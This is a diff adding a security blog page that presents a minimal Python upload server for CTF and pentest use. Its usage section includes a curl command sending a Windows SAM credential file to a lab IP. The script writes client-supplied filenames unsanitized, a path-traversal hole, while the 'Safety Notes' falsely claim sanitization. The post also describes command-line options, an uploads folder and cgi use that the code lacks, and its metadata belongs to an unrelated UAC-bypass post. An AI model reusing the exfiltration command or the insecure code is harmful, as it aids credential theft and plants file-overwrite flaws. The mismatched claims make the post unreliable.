@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- SEO Meta Tags -->
+    <title>The Script: A Minimalist Upload + Download Server | Foruth</title>
+    <meta name="description" content="Everyone knows how to download files using python3 -m http.server 8000. It’s incredibly simple — no extra setup, no hassle. You start the HTTP server,...">
+    <meta name="author" content="Pravin Mohite">
+    <link rel="canonical" href="https://foruth.github.io/posts/Windows%20UAC%20Bypass%20DLL%20Hijacking.html">
+
+    <!-- Open Graph / Social -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Windows UAC Bypass via DLL Hijacking Walkthrough">
+    <meta property="og:description" content="Everyone knows how to download files using python3 -m http.server 8000. It’s incredibly simple — no extra setup, no hassle. You start the HTTP server,...">
+    <meta property="og:url" content="https://foruth.github.io/posts/Windows%20UAC%20Bypass%20DLL%20Hijacking.html">
+    <meta property="og:image" content="https://foruth.github.io/img/og-uac-bypass.png">
+    <meta property="article:published_time" content="2025-12-08T09:00:00Z">
+    <meta property="article:author" content="Pravin Mohite">
+    <meta property="article:tag" content="Windows Security">
+    <meta property="article:tag" content="UAC Bypass">
+    <meta property="article:tag" content="DLL Hijacking">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Windows UAC Bypass via DLL Hijacking Walkthrough">
+    <meta name="twitter:description"
+        content="Learn how to bypass UAC using DLL hijacking on Windows 10 through auto-elevating binaries.">
+    <meta name="twitter:image" content="https://foruth.github.io/img/og-uac-bypass.png">
+
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PWFMBDGDE7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PWFMBDGDE7');
+</script>
+    
+    <!-- Structured Data (Article Schema) -->
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Windows UAC Bypass via DLL Hijacking Walkthrough",
+    "description": "Technical walkthrough of UAC bypass using DLL hijacking on Windows 10. Learn how auto-elevating binaries like SystemPropertiesAdvanced.exe can be exploited to gain elevated privileges.",
+    "image": "https://foruth.github.io/img/og-uac-bypass.png",
+    "author": {
+      "@type": "Person",
+      "name": "Pravin Mohite"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Foruth Security Blog",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://foruth.github.io/img/logo.png"
+      }
+    },
+    "datePublished": "2025-12-08",
+    "dateModified": "2025-12-08"
+  }
+  </script>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Merriweather:wght@400;700&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: ['class', '[data-theme="dark"]'],
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+                        serif: ['Merriweather', 'Georgia', 'serif'],
+                        mono: ['Fira Code', 'Monaco', 'Consolas', 'monospace'],
+                    },
+                }
+            }
+        }
+    </script>
+
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="../css/custom.css">
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+
+    <!-- RSS Feed 
+    <link rel="alternate" type="application/rss+xml" title="Security Research RSS Feed" href="../rss.xml"> -->
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+</head>
+
+<body class="bg-white dark:bg-slate-900 text-slate-800 dark:text-slate-100 min-h-screen transition-colors duration-200">
+
+    <!-- Skip Link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- HEADER / NAVIGATION (same structure as index.html) -->
+    <header
+        class="sticky top-0 z-50 bg-white/80 dark:bg-slate-900/80 backdrop-blur-md border-b border-slate-200 dark:border-slate-700">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+
+                <!-- Logo -->
+                <a href="../index.html"
+                    class="flex items-center gap-2 text-xl font-bold text-slate-900 dark:text-white hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">
+                    <img src="../img/logo.png" alt="Foruth Logo" class="w-8 h-8">
+                    <span>Foruth</span>
+                </a>
+
+                <!-- Navigation -->
+                <nav class="hidden md:flex items-center gap-8 text-sm">
+                    <a href="../index.html"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Home</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">About</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Archive</a>
+                 <!--   <a href="../rss.xml"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">RSS</a> -->
+                </nav>
+
+                <!-- Search & Theme Toggle -->
+                <div class="flex items-center gap-2">
+                    <button id="search-toggle" class="theme-toggle" aria-label="Search" title="Search (Ctrl+K)">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                    </button>
+                    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"
+                        title="Toggle dark mode">
+                        <svg class="icon-sun w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z">
+                            </path>
+                        </svg>
+                        <svg class="icon-moon w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main id="main-content" class="max-w-5xl mx-auto px-4 sm:px-6 py-10">
+
+        <!-- Hero -->
+        <section class="mb-10">
+            <div class="mb-6 rounded-2xl overflow-hidden shadow-sm border border-slate-200 dark:border-slate-800">
+                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=400&fit=crop"
+                    alt="Security and system access concept" width="1200" height="400" loading="eager"
+                    class="w-full h-auto object-cover">
+            </div>
+
+            <div class="flex flex-wrap gap-2 mb-4">
+                <span class="tag-chip">Windows Security</span>
+                <span class="tag-chip">UAC Bypass</span>
+                <span class="tag-chip">DLL Hijacking</span>
+            </div>
+
+            <h1 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4">The Script: A Minimalist Upload + Download Server</h1>
+
+            <section class="not-prose mt-4">
+                <div class="author-box">
+                    <img src="../img/avatar.png" alt="Pravin Mohite" class="author-box__avatar" width="64" height="64">
+                    <div>
+                        <p class="author-box__name">Pravin Mohite</p>
+                        <div
+                            class="mt-2 flex flex-wrap items-center gap-3 text-xs sm:text-sm text-slate-500 dark:text-slate-400">
+                            <time datetime="2025-12-08">December 8, 2025</time>
+                            <span>•</span>
+                            <span>10 min read</span>
+                            <span>•</span>
+                            <span class="inline-flex items-center gap-1">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                </svg>
+                                <span class="js-visitor-count">--</span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </section>
+
+        <!-- Article Body -->
+        <article class="prose prose-slate dark:prose-invert max-w-none">
+<hr>
+<p>Everyone knows how to download files using <code>python3 -m http.server 8000</code>. It’s incredibly simple — no extra setup, no hassle. You start the HTTP server, and instantly everything in that directory becomes downloadable. Beautiful, right?</p>
+<p>But uploading? Oh, that’s where things suddenly get awkward.</p>
+<p>People often fall back to SMB shares, FTP servers, temporary Python scripts, PowerShell tricks, custom listeners — and it starts feeling like way too much work for something that should be just as easy as downloading.</p>
+<p>That annoyance got me thinking: <strong>why isn’t uploading just as painless as starting a simple HTTP server?</strong></p>
+<p>So I decided it <em>should</em> be. And that’s how this tiny Python script, <strong><code>upload-server.py</code></strong>, was born.</p>
+<p>It lets you upload files with the same spirit of simplicity as <code>python3 -m http.server</code>. No dependencies. No frameworks. No complexity. One file. Start it, and boom — instant upload capability.</p>
+<p>Let’s dive in.</p>
+<hr>
+<h2>The Script: A Minimalist Upload + Download Server</h2>
+<ul>
+<li>Save this as</li>
+<li><strong><code>upload-server.py</code></strong>:</li>
+</ul>
+<pre><code class="language-python">#!/usr/bin/env python3
+import http.server
+import os
+import io
+import urllib
+
+class UploadHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        # Serve upload form
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b"""
+            &lt;html&gt;&lt;body&gt;
+            &lt;h2&gt;Upload File&lt;/h2&gt;
+            &lt;form method="POST" enctype="multipart/form-data"&gt;
+                &lt;input type="file" name="file"&gt;&lt;br&gt;&lt;br&gt;
+                &lt;input type="submit" value="Upload"&gt;
+            &lt;/form&gt;
+            &lt;/body&gt;&lt;/html&gt;
+        """)
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        data = self.rfile.read(content_length)
+
+        # Extract filename
+        header = self.headers['Content-Type']
+        boundary = header.split("boundary=")[1].encode()
+        parts = data.split(b'--' + boundary)
+
+        for part in parts:
+            if b'Content-Disposition' in part and b'filename=' in part:
+                # Get filename
+                header_str = part.split(b'\r\n')[1].decode()
+                filename = header_str.split('filename="')[1].split('"')[0]
+
+                # File content starts after blank line
+                file_data = part.split(b'\r\n\r\n')[1].rsplit(b'\r\n', 1)[0]
+
+                with open(filename, "wb") as f:
+                    f.write(file_data)
+
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"Upload successful!\n")
+                return
+
+        self.send_response(400)
+        self.end_headers()
+        self.wfile.write(b"Upload failed.")
+
+if __name__ == "__main__":
+    server = http.server.HTTPServer(('0.0.0.0', 8000), UploadHandler)
+    print("🚀 Upload server running on http://0.0.0.0:8000")
+    server.serve_forever()
+
+</code></pre>
+<hr>
+<h2>How to Use It</h2>
+<ul>
+<li>For This example we are Uploading file from <code>Windows</code> to <code>linux</code></li>
+</ul>
+<p>Start the server:</p>
+<p>from <code>linux</code></p>
+<pre><code>python3 upload_server.py --port 8000
+
+</code></pre>
+<p>Or point it at a different directory:</p>
+<pre><code>python3 upload_server.py --port 8000 --dir /path/to/share
+
+</code></pre>
+<img src="image1.png" alt="image.png" class="w-full h-auto rounded-lg my-4">
+<h4>on <code>Windows</code></h4>
+<ul>
+<li>If you have <code>RDP</code> then,</li>
+</ul>
+<p>Open the server in a browser:</p>
+<pre><code>http://&lt;your-ip&gt;:8000/
+
+</code></pre>
+<p>You’ll see a simple upload form. Any uploaded file goes into the <code>uploads/</code> folder inside whatever directory you launched the script from.</p>
+<p>Clean, minimal, and effective.</p>
+<ul>
+<li>if you just have shell then,</li>
+</ul>
+<p>Open <code>powershell</code> :</p>
+<pre><code class="language-javascript">curl.exe -F "file=@C:\Path\Of\file\that\we\are\uploading" http://&lt;tun0 ip&gt;:8000
+</code></pre>
+<pre><code class="language-javascript">curl.exe -F "file=@C:\Tools\SAM-2021-08-09" http://10.10.14.183:8000
+</code></pre>
+<img src="image2.png" alt="image.png" class="w-full h-auto rounded-lg my-4">
+<hr>
+<img src="image3.png" alt="image.png" class="w-full h-auto rounded-lg my-4">
+<hr>
+<h2>Safety Notes</h2>
+<p>This script is intentionally simple and not hardened. Keep these in mind:</p>
+<ul>
+<li>Don’t expose it to the public internet.</li>
+<li>Uploaded filenames are sanitized, but still avoid using it in hostile environments.</li>
+<li>There are no file size limits.</li>
+<li><code>cgi</code> is deprecated in future Python versions — fine for labs, but not for production.</li>
+</ul>
+<p>For CTFs, labs, and quick pentest drops, this lightweight upload server is perfect.</p>
+<hr>
+<h2>Final Thoughts</h2>
+<p>This little script makes uploading feel just as effortless as downloading with <code>python3 -m http.server</code>. It’s one of those tiny quality-of-life tools that saves time, reduces friction, and keeps you focused on what actually matters during an engagement or challenge.</p>
+</article>
+
+    </main>
+
+    <!-- ============================================
+       FOOTER
+  ============================================ -->
+    <footer class="mt-16 border-t border-slate-200 dark:border-slate-800 bg-white/80 dark:bg-slate-900/80">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 py-10 space-y-8">
+
+            <!-- Links & Social -->
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-6 text-sm">
+                <nav class="flex flex-wrap items-center justify-center gap-4 text-slate-600 dark:text-slate-400">
+                    <a href="../index.html"
+                        class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Home</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">About</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Archive</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                   <!--   <a href="../rss.xml" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">RSS
+                        Feed</a>  -->
+                </nav>
+
+                <div class="flex items-center justify-center gap-4 text-slate-500">
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="GitHub">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="Twitter">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="LinkedIn">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Copyright -->
+            <div class="border-t border-slate-200 dark:border-slate-800 pt-4 text-center text-xs text-slate-500">
+                <p> 2025 Pravin Mohite. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden" role="dialog" aria-modal="true" aria-labelledby="search-title">
+        <div class="search-modal__backdrop"></div>
+        <div class="search-modal__container">
+            <div class="search-modal__content">
+                <div class="search-modal__header">
+                    <div class="search-modal__input-wrapper">
+                        <svg class="search-modal__icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                        <input type="text" id="search-input" class="search-modal__input" placeholder="Search posts..."
+                            autocomplete="off" autofocus>
+                        <kbd class="search-modal__kbd">ESC</kbd>
+                    </div>
+                </div>
+                <div id="search-results" class="search-modal__results">
+                    <p class="search-modal__hint">Type to search posts by title, content, or tags...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="../js/main.js"></script>
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+
+
+</html>
